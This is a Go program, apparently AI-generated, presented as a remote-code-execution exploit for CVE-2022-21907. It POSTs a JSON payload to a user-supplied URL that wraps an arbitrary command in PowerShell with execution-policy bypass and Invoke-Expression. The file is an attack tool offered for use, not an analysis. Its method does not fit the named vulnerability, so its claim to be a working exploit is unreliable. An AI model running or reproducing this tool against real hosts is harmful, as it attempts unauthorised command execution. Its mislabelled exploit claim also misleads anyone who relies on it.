// ChatGPT4.0//
// CVE-2022-21907 RCE!//
package main

import (
	"flag"
	"fmt"
	"net/http"
	"strings"
)

func banner() {
	a := ".--..       ..---.       .-.  .-.  .-.  .-.        .-.   .  .-.  .-..---."
	b := ":     \\     / |          (   ):   :(   )(   )      (   ).'| (   ):   :   /"
	c := "|      \\   /  |---  ____   .' |   |  .'   .'  ____   .'   |  `-/ |   |  / "
	d := ":       \\ /   |           /   :   ; /    /          /     |   /  :   ; /  "
	e := " `--'    '    '---'      '---' `-' '---''---'      '---''---''    `-' '    RCE!"
	g := "-u <url> -shell <powershell.exe>"
	f := "GOo......"
	fmt.Println(a)
	fmt.Println(b)
	fmt.Println(c)
	fmt.Println(d)
	fmt.Println(e)
	fmt.Println(g)
	fmt.Println(f)
}
func main() {
	banner()
	var targetUrl string
	var shellCommand string

	flag.StringVar(&targetUrl, "u", "", "Target URL")
	flag.StringVar(&shellCommand, "shell", "", "Shell command to execute")

	flag.Parse()

	if targetUrl == "" || shellCommand == "" {
		fmt.Println("Error! Please specify the target URL and the shell command to execute using -u and -shell parameters, respectively.")
		return
	}

	payload := fmt.Sprintf(`{"scripts":["powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -Command Invoke-Expression '%s'"]}`, shellCommand)

	client := &http.Client{}
	req, err := http.NewRequest("POST", targetUrl, strings.NewReader(payload))
	if err != nil {
		fmt.Println(err)
		return
	}
	//请根据实际情况为POST修改请求内容
	req.Header.Set("Content-Type", "application/json")
	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 Edge/16.16299")
	req.Header.Set("Accept-Language", "en-US,en;q=0.8")
	req.Header.Set("Accept-Encoding", "gzip, deflate")
	req.Header.Set("Content-Length", fmt.Sprintf("%d", len(payload)))

	resp, err := client.Do(req)
	if err != nil {
		fmt.Println(err)
		return
	}
	defer resp.Body.Close()

	fmt.Println(resp.Status)
	fmt.Println("所有工作结束,PoC不能告诉您命令是否被主机成功执行!")
}
